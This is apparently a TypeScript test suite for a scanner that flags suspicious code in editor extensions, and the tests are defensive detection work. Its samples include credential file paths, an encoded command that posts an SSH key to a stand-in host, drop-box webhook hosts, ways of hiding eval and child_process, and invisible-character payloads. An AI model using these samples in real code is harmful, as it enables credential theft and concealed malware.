/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { CODE_SCAN_LIMITS, CODE_SCAN_RULES, codeScanDigest, codeScanOptionsOf, ICodeScanOptions, readScanFiles, scanExtensionCode } from '../../common/extensionCodeScan.js';

function scan(text: string, options?: ICodeScanOptions) {
	return scanExtensionCode([{ path: 'out/extension.js', text }], options).findings;
}

function rules(text: string, options?: ICodeScanOptions): string[] {
	return scan(text, options).map(finding => `${finding.severity} ${finding.rule}: ${finding.evidence}`);
}

suite('Volt extension code scan (EXT-SCAN)', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	test('EXT-SCAN-1: ordinary extension code has no finding', () => {
		assert.deepStrictEqual(rules([
			`"use strict";`,
			`const vscode = require("vscode");`,
			`const lab_1 = require("./lab");`,
			`const g = Function('return this')();`,
			`async function scout(base, name) { return fetch(\`\${base}/\${name.replace('/', '%2F')}/latest\`); }`,
			`const registry = 'https://registry.npmjs.org';`,
			`const schema = 'http://json-schema.org/draft-07/schema#';`,
			`const page = \`https://www.npmjs.com/package/\${name}\`;`,
			`const child = spawnLike({ env: { ...process.env, FOO: '1' } });`,
			`const re = /["'\`]/g; const label = "don't eval() this, it's text";`,
			`// eval(atob('MTI3LjAuMC4x')); require('child_process')`,
			`/* new Function('x') */`,
		].join('\n'), { declaredHosts: ['registry.npmjs.org'] }), []);
	});

	test('EXT-SCAN-2: credential locations, also built from path pieces', () => {
		assert.deepStrictEqual(rules(`fs.readFileSync('~/.ssh/id_rsa');`), ['medium credential-path: ~/.ssh/id_rsa']);
		assert.deepStrictEqual(rules(`path.join(os.homedir(), '.volt', 'trust', 'grants.json')`), ['medium credential-path: .volt/trust/grants.json']);
		assert.deepStrictEqual(rules(`const p = home + '/Library/Keychains/login.keychain-db';`), ['medium credential-path: /Library/Keychains/login.keychain-db']);
		// Words that only look like the folders are not paths; neither is a regular expression's source.
		assert.deepStrictEqual(rules(`const a = 'my.sshd'; const b = 'foo.aws'; const c = '^(gpg\\\\.ssh|x)$';`), []);
	});

	test('EXT-SCAN-3: eval, Function and vm are dynamic code; Function("return this") is not', () => {
		assert.deepStrictEqual(rules(`eval(code);`), ['medium dynamic-code: eval']);
		assert.deepStrictEqual(rules(`const f = new Function('name', 'return process.getBuiltinModule(name)');`), ['medium dynamic-code: new Function']);
		assert.deepStrictEqual(rules(`const vm = require('node:vm'); vm.runInNewContext(src);`).length, 2);
		assert.deepStrictEqual(rules(`obj.eval(x); Function("return this")(); new Function("return this")();`), []);
	});

	test('EXT-SCAN-4: names hidden by joining, concatenating, reversing or escaping', () => {
		assert.deepStrictEqual(rules(`const cp = load(['child', 'process'].join('_'));`), ['high hidden-name: child_process']);
		assert.deepStrictEqual(rules(`globalThis[['ev', 'al'].join('')]('1');`), ['high hidden-name: eval']);
		assert.deepStrictEqual(rules(`const f = globalThis['ev' + 'al'];`), ['high hidden-name: eval']);
		assert.deepStrictEqual(rules(`const n = 'ssecorp_dlihc'.split('').reverse().join('');`), ['high hidden-name: child_process']);
		assert.deepStrictEqual(rules(`const n = globalThis['\\x65\\x76\\x61\\x6c'];`), ['high hidden-name: eval']);
		// Ordinary joins and concatenations are not.
		assert.deepStrictEqual(rules(`['a', 'b'].join(', '); 'Hello, ' + 'world'; 'abc'.split('').reverse();`), []);
	});

	test('EXT-SCAN-5: encoded payloads that decode to a host, a command or a name', () => {
		assert.deepStrictEqual(rules(`const host = Buffer.from('MTI3LjAuMC4x', 'base64').toString();`), ['high encoded-payload: a network address: 127.0.0.1']);
		assert.deepStrictEqual(rules(`const c = atob('Y3VybCAtZCBAfi8uc3NoL2lkX3JzYSBodHRwczovL3guaW8=');`), ['high encoded-payload: a shell command: curl -d @~/.ssh/id_rsa https://x.io']);
		assert.deepStrictEqual(rules(`const n = Buffer.from('6368696c645f70726f63657373', 'hex').toString();`), ['high encoded-payload: a hidden name: child_process']);
		// Images, fonts and ordinary text are not payloads.
		assert.deepStrictEqual(rules(`const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk', 'base64'); const t = atob('aGVsbG8gd29ybGQ=');`), []);
	});

	test('EXT-SCAN-6: hosts: raw addresses are medium, drop boxes high, declared ones nothing', () => {
		assert.deepStrictEqual(rules(`post('http://127.0.0.1:47913/collect'); post('http://localhost:3000');`), ['medium raw-host: http://127.0.0.1', 'medium raw-host: http://localhost']);
		assert.deepStrictEqual(rules(`fetch('https://webhook.site/abc'); fetch('https://discord.com/api/webhooks/1/x');`), ['high raw-host: https://webhook.site', 'high raw-host: https://discord.com/api/webhooks']);
		assert.deepStrictEqual(rules(`fetch('https://api.github.com/repos'); fetch('https://bucket.s3.amazonaws.com/x');`), []);
		assert.deepStrictEqual(rules(`fetch('http://10.0.0.5/x');`, { declaredHosts: ['10.0.0.5'] }), []);
	});

	test('EXT-SCAN-6b: a bare `*` declares no host, and a drop host is excused only when named exactly', () => {
		// The network broker drops a third party's `*` too (H.7): it must not hide what the code reaches.
		assert.deepStrictEqual(rules(`post('http://127.0.0.1:47913/collect'); fetch('https://webhook.site/abc');`, { declaredHosts: ['*'] }), ['high raw-host: https://webhook.site', 'medium raw-host: http://127.0.0.1']);
		assert.deepStrictEqual(rules(`fetch('https://webhook.site/abc');`, { declaredHosts: ['*.site', '*webhook*'] }), ['high raw-host: https://webhook.site']);
		assert.deepStrictEqual(rules(`fetch('https://webhook.site/abc');`, { declaredHosts: ['webhook.site'] }), []);
		// An ordinary wildcard still names its hosts.
		assert.deepStrictEqual(rules(`fetch('http://10.0.0.5/x');`, { declaredHosts: ['10.0.0.*'] }), []);
	});

	test('EXT-SCAN-7: child_process, computed require, the whole environment, native bindings', () => {
		assert.deepStrictEqual(rules(`const cp = require('child_process'); import('node:child_process');`), ['medium process-spawn: child_process', 'medium process-spawn: node:child_process']);
		assert.deepStrictEqual(rules(`const m = require(name); const n = process.getBuiltinModule(x); require('./literal');`), ['medium computed-require: require(<computed>)', 'medium computed-require: process.getBuiltinModule(<computed>)']);
		assert.deepStrictEqual(rules(`send(JSON.stringify(process.env)); for (const k in process.env) {}`).length, 2);
		assert.deepStrictEqual(rules(`process.binding('fs');`), ['medium native-binding: process.binding']);
		// `__webpack_require__(12)` and `__require(x)` are a bundler's, not computed module names.
		assert.deepStrictEqual(rules(`__webpack_require__(12); __require(x); a.require(y);`), []);
	});

	test('EXT-SCAN-8: vscode.volt calls beyond the manifest, only for extensions that use the volt proposal', () => {
		const code = `await volt.automations.schedule({}); await volt.chats.send(id, 'x'); await volt.usage.get();`;
		assert.deepStrictEqual(rules(code, { declaredCapabilities: ['agents.send@1', 'tools.register'] }), [
			'high undeclared-api: volt.automations.schedule needs automations.schedule',
			'high undeclared-api: volt.usage needs usage.report',
		]);
		assert.deepStrictEqual(rules(code), [], 'without the volt proposal, x.usage.get() is someone else\'s API');
		assert.deepStrictEqual(codeScanOptionsOf({ enabledApiProposals: ['volt'], contributes: { voltCapabilities: { required: [{ id: 'net.connect', targets: ['a.example'] }], optional: [{ id: 'agents.send' }] } } }), { declaredHosts: ['a.example'], declaredCapabilities: ['net.connect', 'agents.send'] });
		assert.deepStrictEqual(codeScanOptionsOf({ contributes: {} }), { declaredHosts: [] });
	});

	test('EXT-SCAN-9: findings merge by rule and evidence, with the first place and a count', () => {
		const result = scanExtensionCode([
			{ path: 'a.js', text: `\n\neval(x);` },
			{ path: 'b.js', text: `eval(y); eval(z);` },
			{ path: 'README.md', text: `eval(readme)` },
			{ path: 'c.js.map', text: `eval(map)` },
		]);
		assert.deepStrictEqual(result.findings.map(finding => [finding.file, finding.line, finding.count]), [['a.js', 3, 3]]);
		assert.strictEqual(result.files, 2);
	});

	test('EXT-SCAN-10: template literals, regular expressions and comments do not derail the lexer', () => {
		assert.deepStrictEqual(rules(`const s = \`a \${ {x: '}'}.x } b \${"\`"}\`; const r = /\\/\\*["']/; eval(q);`), ['medium dynamic-code: eval']);
		assert.deepStrictEqual(rules(`const u = \`http://127.0.0.1:\${port}/x\`;`), ['medium raw-host: http://127.0.0.1']);
		assert.deepStrictEqual(rules(`x = a / b; y = c / d; require(z);`), ['medium computed-require: require(<computed>)']);
	});

	test('EXT-SCAN-11: the digest follows what was found, not where', () => {
		const a = scan(`eval(x); require('child_process');`);
		const b = scanExtensionCode([{ path: 'other.js', text: `\n require("child_process"); eval(y);` }]).findings;
		assert.strictEqual(codeScanDigest(a), codeScanDigest(b));
		assert.notStrictEqual(codeScanDigest(a), codeScanDigest(scan(`eval(x);`)));
		assert.strictEqual(codeScanDigest([]), '00000000');
	});

	test('EXT-SCAN-12: the folder walk reads only code, within its limits', async () => {
		const tree: Record<string, { name: string; directory: boolean; size?: number }[]> = {
			'/ext': [{ name: 'package.json', directory: false, size: 10 }, { name: 'out', directory: true }, { name: '.git', directory: true }, { name: 'big.js', directory: false, size: CODE_SCAN_LIMITS.fileBytes + 1 }],
			'/ext/out': [{ name: 'extension.js', directory: false, size: 9 }, { name: 'extension.js.map', directory: false, size: 9 }],
			'/ext/.git': [{ name: 'hook.js', directory: false, size: 9 }],
		};
		const read: string[] = [];
		const { files, skipped } = await readScanFiles('/ext', {
			list: async path => tree[path] ?? [],
			read: async path => { read.push(path); return 'eval(x);'; },
		});
		assert.deepStrictEqual(files.map(file => file.path), ['out/extension.js']);
		assert.deepStrictEqual(read, ['/ext/out/extension.js']);
		assert.strictEqual(skipped, 1);
	});

	// Invisible characters are built from code points here: this file itself must stay free of them.
	const cp = (...points: number[]) => String.fromCodePoint(...points);
	const run = (from: number, length: number) => cp(...Array.from({ length }, (_, i) => from + (i % 16)));
	const RLO = cp(0x202E), LRI = cp(0x2066), RLI = cp(0x2067), PDI = cp(0x2069), ZWSP = cp(0x200B), ZWJ = cp(0x200D), BOM = cp(0xFEFF), VS16 = cp(0xFE0F);

	test('EXT-SCAN-13: invisible code (GlassWorm, Trojan Source) is high', () => {
		// GlassWorm: a payload of supplementary variation selectors, decoded and run.
		assert.deepStrictEqual(rules(`const s = '${run(0xE0100, 40)}'; eval(decode(s));`), ['high invisible-code: variation selectors in a string', 'medium dynamic-code: eval']);
		// The same with BMP selectors, a run of them after nothing visible.
		assert.deepStrictEqual(rules(`const s = "${run(0xFE00, 6)}";`), ['high invisible-code: variation selectors in a string']);
		// "ASCII smuggling": tag characters spelling text an editor doesn't show.
		assert.deepStrictEqual(rules(`const note = 'hi${cp(0xE0069, 0xE0067, 0xE006E, 0xE006F, 0xE0072, 0xE0065)}';`), ['high invisible-code: Unicode tag characters in a string']);
		// Zero-width runs used as bits.
		assert.deepStrictEqual(rules(`const bits = "a${ZWSP}${cp(0x200C)}${ZWSP}${cp(0x200C)}${ZWSP}b";`), ['high invisible-code: zero-width characters in a string']);
		// Trojan Source, commenting-out: an override left open in a comment.
		assert.deepStrictEqual(rules(`/*${RLO} } ${LRI}if (isAdmin)${PDI} ${LRI} begin admins only */\nrun();`), ['high invisible-code: bidi controls left open in a comment']);
		// Trojan Source, stretched string.
		assert.deepStrictEqual(rules(`if (level != "user${RLO} ${LRI}// Check if admin${PDI} ${LRI}") { grant(); }`), ['high invisible-code: bidi controls left open in a string']);
		// Anything of these in code itself (an identifier with a zero-width space, a selector after a name).
		assert.deepStrictEqual(rules(`const a${ZWSP} = 1;`), ['high invisible-code: zero-width characters in code']);
		assert.deepStrictEqual(rules(`const b = x${cp(0xFE01)};`), ['high invisible-code: variation selectors in code']);
		assert.deepStrictEqual(rules(`const s = 1;\n// ${run(0xE0100, 12)}\n`), ['high invisible-code: variation selectors in a comment']);
		assert.strictEqual(CODE_SCAN_RULES[0], 'invisible-code', 'listed first');
	});

	test('EXT-SCAN-14: what ordinary bundles do with these characters is no finding', () => {
		assert.deepStrictEqual(rules([
			`${BOM}"use strict";`,
			// Emoji: a selector after a visible character, a ZWJ family, a keycap, a flag's tag sequence.
			`const heart = "${cp(0x2764)}${VS16}", family = "${cp(0x1F468)}${ZWJ}${cp(0x1F469)}${ZWJ}${cp(0x1F467)}", one = "1${VS16}${cp(0x20E3)}";`,
			`const wales = "${cp(0x1F3F4, 0xE0067, 0xE0062, 0xE0077, 0xE006C, 0xE0073, 0xE007F)}";`,
			// HTML entity tables: a selector after the symbol it varies.
			`const entities = { lvertneqq: "${cp(0x2268)}${cp(0xFE00)}", ZeroWidthSpace: "${ZWSP}", zwj: "${ZWJ}", NoBreak: "${cp(0x2060)}" };`,
			// Comparisons and BOM stripping.
			`if (ch === "${ZWJ}" || ch === "${VS16}") { skip(); } text = text.replace("${BOM}", "");`,
			// Character classes, as regular expressions and as strings to build one from (acorn, xterm).
			`const strip = /[${ZWSP}-${ZWJ}${BOM}]/g; const ranges = "${cp(0x200C)}${ZWJ}${cp(0xB7)}${cp(0x300)}-${cp(0x36F)}${cp(0xFE00)}-${cp(0xFE0F)}";`,
			`const controls = new RegExp("[${cp(0x202A)}-${RLO}${LRI}${RLI}${PDI}${BOM}]", "g");`,
			// Localized text with its bidi isolates closed again.
			`const label = "${RLI}${cp(0x5E9, 0x5DC, 0x5D5, 0x5DD)}${PDI}: ok";`,
			// Icon fonts: a few private-use glyphs.
			`const icons = { gear: "${cp(0xE001)}", bell: "${cp(0xF101, 0xF102)}", strip: "${run(0xF880, 20)}" };`,
		].join('\n')), []);
	});
});
